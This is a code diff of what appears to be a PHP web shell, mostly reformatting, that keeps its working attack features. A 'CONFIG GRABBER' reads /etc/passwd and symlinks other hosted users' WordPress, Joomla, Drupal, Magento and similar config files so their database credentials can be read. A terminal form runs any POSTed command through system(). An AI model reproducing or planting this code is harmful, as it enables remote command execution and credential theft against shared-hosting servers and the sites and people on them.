@@ -1117,9 +1117,9 @@ function myFunction() {
         public static function info($info = null) {
             switch ($info) {
                 case 'hdd':
-                    return "Total : ". self::formatSize(disk_total_space(getcwd())) ." &nbsp;&nbsp;
+                    return "Total : ". self::formatSize(disk_total_space(getcwd())) ." &nbsp;&nbsp;<br>
                             Free  : ".self::formatSize(disk_free_space(getcwd())) ."&nbsp;&nbsp;<br>
-                            [ ".(int) (disk_free_space(getcwd())/disk_total_space(getcwd())*100)."% ]";
+                            Persentase : [ ".(int) (disk_free_space(getcwd())/disk_total_space(getcwd())*100)."% ]";
                     break;
                 case 'disable_function':
                     return (!empty(@ini_get("disable_functions"))) ? @ini_get("disable_functions") : "<font color=green>NONE</font>";
@@ -1199,107 +1199,109 @@ function myFunction() {
             }
         }
         public static function config($passwd) {
-        	mkdir(".config", 0777);
-        	chdir(".config");
-        	system("ln -s / root");
-        	$explode = explode("\n", $passwd);
-        	foreach ($explode as $pawd) {
-        		$pass = explode(":", $pawd);
-        		$user = $pass[5];
-        		$jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
-        		if (preg_match('/vhosts/i', $user)) {
-        			system("ln -s ".$user."/httpdocs/wp-config.php ".$jembod."-Wordpress.txt");
-					system("ln -s ".$user."/httpdocs/configuration.php ".$jembod."-Joomla.txt");
-					system("ln -s ".$user."/httpdocs/config/koneksi.php ".$jembod."-Lokomedia.txt");
-					system("ln -s ".$user."/httpdocs/forum/config.php ".$jembod."-phpBB.txt");
-					system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$jembod."-Drupal.txt");
-					system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$jembod."-PrestaShop.txt");
-					system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$jembod."-Magento.txt");
-					system("ln -s ".$user."/httpdocs/admin/config.php ".$jembod."-OpenCart.txt");
-					system("ln -s ".$user."/httpdocs/application/config/database.php ".$jembod."-Ellislab.txt");
-					system("ln -s ".$user."/httpdocs/inc/connect.php ".$jembod."-Parallels.txt");
-					system("ln -s ".$user."/httpdocs/inc/config.php ".$jembod."-MyBB.txt");
-        		}
-        	}
+            mkdir(".config", 0777);
+            chdir(".config");
+            system("ln -s / root");
+            $explode = explode("\n", $passwd);
+            foreach ($explode as $pawd) {
+                $pass = explode(":", $pawd);
+                $user = $pass[5];
+                $jembod = preg_replace('/\/var\/www\/vhosts\//', '', $user);
+                if (preg_match('/vhosts/i', $user)) {
+                    system("ln -s ".$user."/httpdocs/wp-config.php ".$jembod."-Wordpress.txt");
+                    system("ln -s ".$user."/httpdocs/configuration.php ".$jembod."-Joomla.txt");
+                    system("ln -s ".$user."/httpdocs/config/koneksi.php ".$jembod."-Lokomedia.txt");
+                    system("ln -s ".$user."/httpdocs/forum/config.php ".$jembod."-phpBB.txt");
+                    system("ln -s ".$user."/httpdocs/sites/default/settings.php ".$jembod."-Drupal.txt");
+                    system("ln -s ".$user."/httpdocs/config/settings.inc.php ".$jembod."-PrestaShop.txt");
+                    system("ln -s ".$user."/httpdocs/app/etc/local.xml ".$jembod."-Magento.txt");
+                    system("ln -s ".$user."/httpdocs/admin/config.php ".$jembod."-OpenCart.txt");
+                    system("ln -s ".$user."/httpdocs/application/config/database.php ".$jembod."-Ellislab.txt");
+                    system("ln -s ".$user."/httpdocs/inc/connect.php ".$jembod."-Parallels.txt");
+                    system("ln -s ".$user."/httpdocs/inc/config.php ".$jembod."-MyBB.txt");
+                }
+            }
 
         }
         public static function tools($name = null) {
-        	switch ($name) {
-        		case 'terminal':
-        			?>
-        			<div class="edit">
-        				<table width="100%" class="edit">
-        					<tr>
-        						<td class="action">
-        							<span>Terminal</span>
-        						</td>
-        					</tr>
-        					<form method="post">
-        						<tr>
-        							<td>
-        								<input type="text" name="command" placeholder="command">
-        							</td>
-        						</tr>
-        						<tr>
-        							<td>
-        								<input type="submit" name="submit">
-        							</td>
-        						</tr>
-        					</form>
-        					<tr>
-        						<td>
-        							<?php
-        							if (isset($_POST['submit'])) {
-        								if ($_POST['command']) {
-        									print("<textarea readonly>".self::featureShell($_POST['command'])."</textarea>");
-        								}
-        							}
-        							?>
-        						</td>
-        					</tr>
-        				</table>
-        			</div>
-        			<?php
-        			break;
-        		case 'config':
-        			if (isset($_POST['submit'])) {
-        				if (self::config($_POST['passwd'])) {
-        					print("success");
-        				} else {
-        					?> <script>window.location='.config'</script> <?php
-        				}
-        			}
-        			?>
-        			<div class="edit">
-        				<table width="100%" class="edit">
-        					<tr>
-        						<td class="action" colspan="3">
-        							<center>
-        								<i class="fa fa-cogs"></i> CONFIG GRABBER</span>
-        							</center>
-        						</td>
-        					</tr>
-        					<form method="post">
-        						<tr>
-        							<td>
-        								<textarea name="passwd"><?= include("/etc/passwd") ?></textarea>
-        							</td>
-        						</tr>
-        						<tr>
-        							<td>
-        								<input type="submit" name="submit">
-        							</td>
-        						</tr>
-        					</form>
-        				</table>
-        			</div>
-        			<?php
-        			break;
-        		
-        		default:
-        			# code...
-        			break;
-        	}
+            switch ($name) {
+                case 'terminal':
+                    ?>
+                    <div class="edit">
+                        <table width="100%" class="edit">
+                            <tr>
+                                <td class="action">
+                                    <span>Terminal</span>
+                                </td>
+                            </tr>
+                            <form method="post">
+                                <tr>
+                                    <td>
+                                        <input type="text" name="command" placeholder="command">
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <input type="submit" name="submit">
+                                    </td>
+                                </tr>
+                            </form>
+                            <?php
+                            if (isset($_POST['submit'])) {
+                                if ($_POST['command']) {
+                                    ?>
+                                    <tr>
+                                        <td>
+                                            <textarea style="height:330px;" readonly><?= system($_POST['command']) ?></textarea>
+                                        </td>
+                                    </tr>
+                                    <?php
+                                }
+                            }
+                            ?>
+                        </table>
+                    </div>
+                    <?php
+                    break;
+                case 'config':
+                    if (isset($_POST['submit'])) {
+                        if (self::config($_POST['passwd'])) {
+                            print("success");
+                        } else {
+                            ?> <script>window.location='.config'</script> <?php
+                        }
+                    }
+                    ?>
+                    <div class="edit">
+                        <table width="100%" class="edit">
+                            <tr>
+                                <td class="action" colspan="3">
+                                    <center>
+                                        <i class="fa fa-cogs"></i> CONFIG GRABBER</span>
+                                    </center>
+                                </td>
+                            </tr>
+                            <form method="post">
+                                <tr>
+                                    <td>
+                                        <textarea name="passwd"><?= include("/etc/passwd") ?></textarea>
+                                    </td>
+                                </tr>
+                                <tr>
+                                    <td>
+                                        <input type="submit" name="submit">
+                                    </td>
+                                </tr>
+                            </form>
+                        </table>
+                    </div>
+                    <?php
+                    break;
+                
+                default:
+                    # code...
+                    break;
+            }
         } 
         public static function countDir($filename) {
             return @count(scandir($filename)) -2;
@@ -2063,13 +2065,13 @@ function myFunction() {
         exit();
     }
     if (isset($_GET['terminal'])) {
-    	//print('<script>alert("<h3>Cooming Soon</h3>")</script>');
-    	x::tools('terminal', $_GET['cd']);
-    	exit();
+        //print('<script>alert("<h3>Cooming Soon</h3>")</script>');
+        x::tools('terminal', $_GET['cd']);
+        exit();
     }
     if (isset($_GET['config'])) {
-    	x::tools('config', '');
-    	exit();
+        x::tools('config', '');
+        exit();
     }
     if (isset($_GET['upload'])) {
         ?>
